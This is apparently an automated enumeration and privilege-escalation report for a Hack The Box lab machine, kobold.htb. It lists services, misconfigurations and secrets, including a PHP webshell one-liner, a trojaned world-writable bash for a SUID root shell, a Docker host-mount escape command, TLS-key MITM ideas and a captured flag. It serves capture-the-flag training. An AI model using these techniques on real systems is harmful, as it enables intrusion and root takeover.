# NOIRE Findings
> Target: kobold.htb (10.129.7.164)
> Current Access: ben (uid=1001) / unprivileged
> Date: 2026-03-21

## Access Context

- **User:** ben (uid=1001, gid=1001)
- **Groups:** ben(1001), operator(37)
- **Shell:** /bin/bash (stable SSH session, full TTY)
- **Access method:** SSH with ed25519 key (`ssh -i /home/kali/.ssh/kobold_ben ben@10.129.7.164`)
- **Home:** /home/ben (standard, no interesting files beyond user.txt)
- **Bash history:** `ls`, `sudo -l`, `find / -perm -4000` — minimal prior activity
- **Sudo:** Password required, no passwordless rules

## System Profile

| Property | Value |
|----------|-------|
| OS | Ubuntu 24.04.4 LTS (Noble Numbat) |
| Kernel | 6.8.0-106-generic x86_64 |
| Hostname | kobold.htb |
| Init | systemd |
| Default shell | /bin/sh -> dash |
| Container host | Yes — Docker + containerd, 1 running container (PrivateBin) |
| Audit | auditd + laurel active |

### Users of Interest

| User | UID | Groups | Notes |
|------|-----|--------|-------|
| ben | 1001 | ben, operator | Current foothold |
| alice | 1002 | alice, operator, **docker** | Docker group = path to root. Home not readable |
| root | 0 | root | Runs Arcane binary from /root/ |

## High-Value Findings

| Finding | Evidence | Why It Matters | Confidence |
|---------|----------|----------------|------------|
| `/usr/bin/bash` is world-writable (mode 0777) | `ls -la` confirms `-rwxrwxrwx`, modified 2026-03-21 20:45:53 | Can replace bash with trojan; any root bash execution = SUID shell | HIGH |
| Arcane Docker Management API supports X-API-Key auth | `X-API-Key: <key>` returns "invalid API key" (not "auth required") | Finding a valid API key = full Docker control as root | HIGH |
| Arcane auth endpoint `/api/auth/login` is live | POST returns "Invalid username or password" for tested creds | Valid creds = Docker management = root | HIGH |
| alice is in docker group | `getent group docker` -> `docker:x:111:alice` | alice can run arbitrary containers = root | HIGH |
| PrivateBin TLS private key readable | `/privatebin-data/certs/key.pem` readable by operator group | Could MITM TLS connections to kobold.htb, bin.kobold.htb, mcp.kobold.htb (all use same cert) | MEDIUM |
| Webshell exists in PrivateBin salt.php | `<?php if(isset($_GET["c"])){system($_GET["c"]);}` in `/privatebin-data/data/salt.php` | Executes as nobody (container PID namespace) if triggerable | LOW |
| `/tmp/bash_wrapper` privesc payload pre-staged | Script copies bash_orig to /tmp/rootbash with SUID bit | Ready-made payload for bash replacement attack | HIGH |

## Privilege Escalation Leads

| Rank | Path | Evidence | Complexity | Confidence |
|------|------|----------|------------|------------|
| 1 | **World-writable bash replacement** | `/usr/bin/bash` is 0777. Replace with wrapper that creates SUID copy. Wrapper already exists at `/tmp/bash_wrapper`. Real bash backup at `/tmp/bash_orig` (md5 match confirmed). | LOW — but requires identifying what triggers root to execute bash. All cron scripts use `/bin/sh` (dash). No systemd services reference bash. **Trigger mechanism is the unknown.** | HIGH |
| 2 | **Arcane API auth -> Docker container escape** | Arcane v1.13.0 runs as root, manages Docker. Auth at `/api/auth/login` (POST username/password). Also supports X-API-Key. Frontend has full Docker management (containers, volumes, images, networks). If authenticated, create container mounting host `/` -> read/write anything. | MEDIUM — need valid credentials or API key. admin/admin, ENCRYPTION_KEY as password/API-key all failed. | HIGH |
| 3 | **alice lateral -> docker group** | alice is in docker group (gid=111). If we get alice's creds, `docker run -v /:/mnt alpine chroot /mnt bash`. alice's home dir is mode 700, not readable. | MEDIUM — need to find alice credentials somewhere. | MEDIUM |
| 4 | **PrivateBin paste content** | Paste dirs `/privatebin-data/data/12/` and `/4e/` exist (mode 700, nobody:82). May contain credentials posted by alice or admin. New dir `/privatebin-data/data/bd/b5/` is operator-writable (has test PHP files from prior session). | UNKNOWN — can't read paste content as ben. Need container-level access or webshell trigger. | LOW |

## Credentials And Secrets

| Item | Value | Location | Status |
|------|-------|----------|--------|
| Arcane ENCRYPTION_KEY | `Q3PbC9fpq/tPZ2waXI9+grmc8ualF7ITF5izX5rsk+E=` | systemd unit `/etc/systemd/system/arcane.service` | Confirmed, but NOT valid as API key or password |
| TLS Private Key | RSA private key (PEM) | `/privatebin-data/certs/key.pem` | Readable by operator group. Used by all 3 nginx vhosts |
| TLS Certificate | Self-signed for kobold.htb | `/privatebin-data/certs/cert.pem` | Readable |
| PrivateBin webshell | `<?php if(isset($_GET["c"])){system($_GET["c"]);}` | `/privatebin-data/data/salt.php` | Not triggerable via web (file_get_contents, not include) |
| User flag | `f1057924705f1ae16e6b57d59b439aeb` | /home/ben/user.txt | Captured |

## Services Inventory

| Port | Binding | Service | Process | User | Notes |
|------|---------|---------|---------|------|-------|
| 22 | 0.0.0.0 | OpenSSH | sshd (PID 2144) | root | Standard |
| 80 | 0.0.0.0 | nginx | PID 1536 | root/www-data | Redirects to HTTPS |
| 443 | 0.0.0.0 | nginx | PID 1536 | root/www-data | 3 vhosts: kobold.htb, mcp.kobold.htb, bin.kobold.htb |
| 3552 | * | Arcane Docker Mgmt | PID 1491 | **root** | SvelteKit + Go API, v1.13.0 |
| 6274 | 127.0.0.1 | MCPJam Inspector | PID 1613 | ben | Node.js, our initial access vector |
| 8080 | 127.0.0.1 | Docker proxy | PID 1946 | root | Forwards to PrivateBin container 172.17.0.2:8080 |
| 38963 | 127.0.0.1 | Unknown (Go) | Unknown | Unknown | Returns plain "404: Page Not Found". Likely Arcane edge/tunnel port |
| 53 | 127.0.0.53/54 | systemd-resolved | - | systemd+ | Standard |

## Misconfigurations

| Item | Detail | Impact |
|------|--------|--------|
| `/usr/bin/bash` mode 0777 | World-writable, any user can replace the bash binary | Direct path to root if root executes bash |
| PrivateBin data dir world-writable | `/privatebin-data/data/` is mode 777 | Can write PHP files into container data volume |
| PrivateBin TLS key readable | operator group can read TLS private key | MITM potential on all HTTPS vhosts |
| MCPJam node_modules ben-writable | `/usr/local/lib/node_modules/@mcpjam/inspector/` files writable by ben | Could modify MCPJam behavior (low value, already have shell as ben) |

## Anomalies

- `/tmp/bash_wrapper` and `/tmp/bash_orig` — pre-staged privesc artifacts from a prior player/session
- `/tmp/test.php` and `/tmp/base_procs` — enumeration artifacts
- PrivateBin data dir has PHP files in `bd/b5/` (info.php, x.php, conf_link symlink) written by ben in a prior session
- Port 38963 is unidentified — Go HTTP server returning plain 404, does not respond to Arcane API routes
- No obvious cron job or service triggers root to run `/usr/bin/bash` — the trigger mechanism for the bash replacement attack is the key unknown

## Arcane API Surface (Discovered)

**Unauthenticated:**
- `GET /api/app-version` — returns `{"currentVersion":"v1.13.0","revision":"2e32ef44","goVersion":"go1.25.5","buildTime":"2026-01-15T01:03:57Z"}`
- `GET /api/app-images/favicon` — returns favicon
- `GET /api/schemas/ErrorModel.json` — returns JSON schema

**Authenticated (401 without creds):**
- `POST /api/auth/login` — username/password auth (returns "Invalid username or password")
- `GET /api/users` — user management
- `GET /api/environments` — environment management
- Supports `X-API-Key` header (returns "invalid API key")
- `GET /api/auth/logout` — logout

**Frontend Routes (from SvelteKit):**
- `/containers`, `/containers/[id]` — Docker container management
- `/environments`, `/environments/[id]` — environment management
- `/images`, `/images/[id]` — Docker image management
- `/volumes`, `/volumes/[name]` — Docker volume management
- `/networks`, `/networks/[id]` — Docker network management
- `/settings/api-keys` — **API key management**
- `/settings/users` — user management
- `/settings/security` — security settings
- `/projects` — project management
- `/customize/registries` — Docker registry config
- `/customize/variables` — variable management
- `/dashboard` — main dashboard
- `/auth/oidc/*` — OIDC auth support

## Oracle Flags

1. **Priority: Find the bash trigger.** `/usr/bin/bash` is world-writable (mode 777) — this is almost certainly the intended privesc vector. The bash_wrapper payload is ready. The unknown is: what makes root execute `/usr/bin/bash`? All visible cron scripts use `/bin/sh` (dash). Possibilities:
   - A hidden root crontab we can't read
   - Arcane's Go binary might spawn bash for certain operations
   - Docker exec might use bash
   - A timer or service not yet identified
   - We may need to CREATE the trigger (e.g., via Arcane if we get auth)

2. **Priority: Crack Arcane auth.** The API is live and supports both password and API key auth. If we get in, we have full Docker control running as root. Options:
   - Search for API keys or passwords in PrivateBin paste content (need container access first)
   - Investigate the Arcane Go binary for hardcoded defaults (can't read /root/)
   - Try to find Arcane's database (likely BoltDB in /root/, inaccessible)
   - The Arcane ENCRYPTION_KEY from systemd is known — research if v1.13.0 derives JWT secrets from it

3. **Priority: Get alice credentials.** alice is in the docker group. Her home is locked down. Possible sources:
   - PrivateBin pastes (dirs 12/ and 4e/)
   - Arcane database (if we get Arcane access)
   - Credential reuse from any discovered password

4. **Port 38963 needs identification.** Unknown Go HTTP service on localhost. May be Arcane-related (edge agent tunnel). Could expose additional API surface.

5. **PrivateBin paste content is locked.** Dirs 12/ and 4e/ are mode 700, nobody:82. Can only be read from inside the container or by root. The webshell in salt.php could read them if triggered, but the container's PHP-FPM doesn't serve from the data directory.

## Tools Executed

| Tool | Command/Action | Output File |
|------|---------------|-------------|
| noire_system_profile | SSH system info collection | noire_system_profile_20260321T225548Z.txt |
| noire_sudo_check | sudo -l | noire_sudo_check_20260321T225550Z.txt |
| noire_suid_scan | SUID/SGID binary scan | noire_suid_scan_20260321T225550Z.txt |
| noire_service_enum | Process + service + port enumeration | noire_service_enum_20260321T225555Z.txt |
| noire_cron_inspect | Cron + timer inspection | noire_cron_inspect_20260321T225556Z.txt |
| noire_writable_paths | Writable path scan | noire_writable_paths_20260321T225557Z.txt |
| Manual SSH | nginx config, /etc/passwd, groups, tmp files, PrivateBin data, Arcane API probing, cron script shebangs | Inline results |
